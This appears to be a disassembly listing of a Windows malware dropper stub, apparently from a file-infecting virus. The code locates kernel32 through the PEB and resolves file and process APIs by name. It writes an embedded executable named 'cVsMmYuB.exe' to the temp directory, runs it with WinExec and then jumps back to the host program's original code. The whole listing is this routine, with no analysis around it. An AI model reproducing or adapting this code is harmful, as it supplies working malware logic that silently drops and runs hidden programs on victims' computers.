
// block 004d9000
004d9000  push       ebp
004d9001  mov        ebp, esp
004d9003  sub        esp, 0x16c
004d9009  xor        eax, eax
004d900b  push       ebx
004d900c  push       esi
004d900d  push       edi
004d900e  mov        dword ptr [ebp - 0x24], eax
004d9011  mov        dword ptr [ebp - 0x10], eax
004d9014  mov        dword ptr [ebp - 0x14], eax
004d9017  mov        dword ptr [ebp - 8], eax
004d901a  mov        dword ptr [ebp - 0xc], eax
004d901d  mov        dword ptr [ebp - 0x20], eax
004d9020  mov        dword ptr [ebp - 0x18], eax
004d9023  mov        dword ptr [ebp - 0x48], 0x4d735663
004d902a  mov        dword ptr [ebp - 0x44], 0x4275596d
004d9031  mov        dword ptr [ebp - 0x40], 0x6578652e
004d9038  mov        dword ptr [ebp - 0x3c], 0
004d903f  call       0x4d9044
004d9044  pop        eax
004d9045  add        eax, 0x225
004d904a  mov        dword ptr [ebp - 4], eax
004d904d  mov        eax, dword ptr fs:[0x30]
004d9053  mov        dword ptr [ebp - 0x28], eax
004d9056  mov        eax, dword ptr [ebp - 4]
004d9059  mov        dword ptr [eax], 0xe904c483
004d905f  mov        eax, dword ptr [ebp - 4]
004d9062  mov        dword ptr [eax + 4], 0xfff955ac
004d9069  mov        eax, dword ptr [ebp - 0x28]
004d906c  mov        eax, dword ptr [eax + 0xc]
004d906f  mov        eax, dword ptr [eax + 0x1c]
004d9072  mov        eax, dword ptr [eax]
004d9074  mov        eax, dword ptr [eax + 8]

// block 004d9077
004d9077  mov        ecx, dword ptr [eax + 0x3c]
004d907a  mov        ecx, dword ptr [ecx + eax + 0x78]
004d907e  add        ecx, eax
004d9080  mov        edi, dword ptr [ecx + 0x1c]
004d9083  mov        ebx, dword ptr [ecx + 0x20]
004d9086  mov        esi, dword ptr [ecx + 0x24]
004d9089  mov        ecx, dword ptr [ecx + 0x18]
004d908c  add        esi, eax
004d908e  add        edi, eax
004d9090  add        ebx, eax
004d9092  xor        edx, edx
004d9094  mov        dword ptr [ebp - 0x30], esi
004d9097  mov        dword ptr [ebp - 0x1c], edx
004d909a  mov        dword ptr [ebp - 0x34], ecx

// block 004d909d
004d909d  cmp        edx, dword ptr [ebp - 0x34]
004d90a0  jae        0x4d91ee

// block 004d90a6
004d90a6  movzx      ecx, word ptr [esi + edx*2]
004d90aa  mov        edx, dword ptr [ebx + edx*4]
004d90ad  mov        esi, dword ptr [edi + ecx*4]
004d90b0  add        edx, eax
004d90b2  mov        ecx, dword ptr [edx]
004d90b4  add        esi, eax
004d90b6  cmp        ecx, 0x4d746547
004d90bc  jne        0x4d9110

// block 004d90be
004d90be  cmp        dword ptr [edx + 4], 0x6c75646f
004d90c5  jne        0x4d9110

// block 004d90c7
004d90c7  cmp        dword ptr [edx + 8], 0x6e614865
004d90ce  jne        0x4d9110

// block 004d90d0
004d90d0  cmp        dword ptr [edx + 0xc], 0x41656c64
004d90d7  jne        0x4d9110

// block 004d90d9
004d90d9  cmp        byte ptr [edx + 0x10], 0
004d90dd  jne        0x4d9110

// block 004d90df
004d90df  cmp        dword ptr [ebp - 0x24], 0
004d90e3  jne        0x4d91bb

// block 004d90e9
004d90e9  and        dword ptr [ebp - 0x5c], 0
004d90ed  lea        eax, [ebp - 0x68]
004d90f0  push       eax
004d90f1  mov        dword ptr [ebp - 0x24], esi
004d90f4  mov        dword ptr [ebp - 0x68], 0x6e72654b
004d90fb  mov        dword ptr [ebp - 0x64], 0x32336c65
004d9102  mov        dword ptr [ebp - 0x60], 0x6c6c642e
004d9109  call       esi

// block 004d910b
004d910b  jmp        0x4d9077

// block 004d9110
004d9110  cmp        ecx, 0x456e6957
004d9116  jne        0x4d9129

// block 004d9118
004d9118  cmp        dword ptr [edx + 4], 0x636578
004d911f  jne        0x4d9129

// block 004d9121
004d9121  mov        dword ptr [ebp - 0xc], esi
004d9124  jmp        0x4d91bb

// block 004d9129
004d9129  cmp        ecx, 0x736f6c43
004d912f  jne        0x4d9148

// block 004d9131
004d9131  cmp        dword ptr [edx + 4], 0x6e614865
004d9138  jne        0x4d9148

// block 004d913a
004d913a  cmp        dword ptr [edx + 8], 0x656c64
004d9141  jne        0x4d9148

// block 004d9143
004d9143  mov        dword ptr [ebp - 8], esi
004d9146  jmp        0x4d91bb

// block 004d9148
004d9148  cmp        ecx, 0x74697257
004d914e  jne        0x4d9167

// block 004d9150
004d9150  cmp        dword ptr [edx + 4], 0x6c694665
004d9157  jne        0x4d9167

// block 004d9159
004d9159  movzx      ecx, word ptr [edx + 8]
004d915d  cmp        ecx, 0x65
004d9160  jne        0x4d9167

// block 004d9162
004d9162  mov        dword ptr [ebp - 0x14], esi
004d9165  jmp        0x4d91bb

// block 004d9167
004d9167  mov        ecx, dword ptr [edx]
004d9169  cmp        ecx, 0x61657243
004d916f  jne        0x4d9188

// block 004d9171
004d9171  cmp        dword ptr [edx + 4], 0x69466574
004d9178  jne        0x4d9188

// block 004d917a
004d917a  cmp        dword ptr [edx + 8], 0x41656c
004d9181  jne        0x4d9188

// block 004d9183
004d9183  mov        dword ptr [ebp - 0x10], esi
004d9186  jmp        0x4d91bb

// block 004d9188
004d9188  cmp        ecx, 0x54746547
004d918e  jne        0x4d91a7

// block 004d9190
004d9190  cmp        dword ptr [edx + 4], 0x50706d65
004d9197  jne        0x4d91a7

// block 004d9199
004d9199  cmp        dword ptr [edx + 8], 0x41687461
004d91a0  jne        0x4d91a7

// block 004d91a2
004d91a2  mov        dword ptr [ebp - 0x20], esi
004d91a5  jmp        0x4d91bb

// block 004d91a7
004d91a7  cmp        ecx, 0x7274736c
004d91ad  jne        0x4d91bb

// block 004d91af
004d91af  cmp        dword ptr [edx + 4], 0x41746163
004d91b6  jne        0x4d91bb

// block 004d91b8
004d91b8  mov        dword ptr [ebp - 0x18], esi

// block 004d91bb
004d91bb  xor        ecx, ecx
004d91bd  cmp        dword ptr [ebp - 0x24], ecx
004d91c0  je         0x4d91e0

// block 004d91c2
004d91c2  cmp        dword ptr [ebp - 0x10], ecx
004d91c5  je         0x4d91e0

// block 004d91c7
004d91c7  cmp        dword ptr [ebp - 0x14], ecx
004d91ca  je         0x4d91e0

// block 004d91cc
004d91cc  cmp        dword ptr [ebp - 8], ecx
004d91cf  je         0x4d91e0

// block 004d91d1
004d91d1  cmp        dword ptr [ebp - 0xc], ecx
004d91d4  je         0x4d91e0

// block 004d91d6
004d91d6  cmp        dword ptr [ebp - 0x20], ecx
004d91d9  je         0x4d91e0

// block 004d91db
004d91db  cmp        dword ptr [ebp - 0x18], ecx
004d91de  jne        0x4d91ee

// block 004d91e0
004d91e0  inc        dword ptr [ebp - 0x1c]
004d91e3  mov        esi, dword ptr [ebp - 0x30]
004d91e6  mov        edx, dword ptr [ebp - 0x1c]
004d91e9  jmp        0x4d909d

// block 004d91ee
004d91ee  lea        eax, [ebp - 0x16c]
004d91f4  push       eax
004d91f5  push       0x104
004d91fa  call       dword ptr [ebp - 0x20]

// block 004d91fd
004d91fd  lea        eax, [ebp - 0x48]
004d9200  push       eax
004d9201  lea        eax, [ebp - 0x16c]
004d9207  push       eax
004d9208  call       dword ptr [ebp - 0x18]

// block 004d920b
004d920b  xor        edi, edi
004d920d  push       edi
004d920e  push       0x80
004d9213  push       2
004d9215  push       edi
004d9216  push       edi
004d9217  push       0xc0000000
004d921c  lea        eax, [ebp - 0x16c]
004d9222  push       eax
004d9223  call       dword ptr [ebp - 0x10]

// block 004d9226
004d9226  mov        esi, eax
004d9228  cmp        esi, -1
004d922b  je         0x4d9265

// block 004d922d
004d922d  mov        eax, dword ptr [ebp - 4]
004d9230  xor        ecx, ecx

// block 004d9232
004d9232  cmp        dword ptr [eax], 0x905a4d
004d9238  je         0x4d9246

// block 004d923a
004d923a  inc        eax
004d923b  inc        ecx
004d923c  cmp        ecx, 0x1f4
004d9242  jl         0x4d9232

// block 004d9244
004d9244  jmp        0x4d9255

// block 004d9246
004d9246  push       edi
004d9247  lea        ecx, [ebp - 0x2c]
004d924a  push       ecx
004d924b  push       0x3e00
004d9250  push       eax
004d9251  push       esi
004d9252  call       dword ptr [ebp - 0x14]

// block 004d9255
004d9255  push       esi
004d9256  call       dword ptr [ebp - 8]

// block 004d9259
004d9259  push       5
004d925b  lea        eax, [ebp - 0x16c]
004d9261  push       eax
004d9262  call       dword ptr [ebp - 0xc]

// block 004d9265
004d9265  pop        edi
004d9266  pop        esi
004d9267  pop        ebx
004d9268  leave      
004d9269  ret        
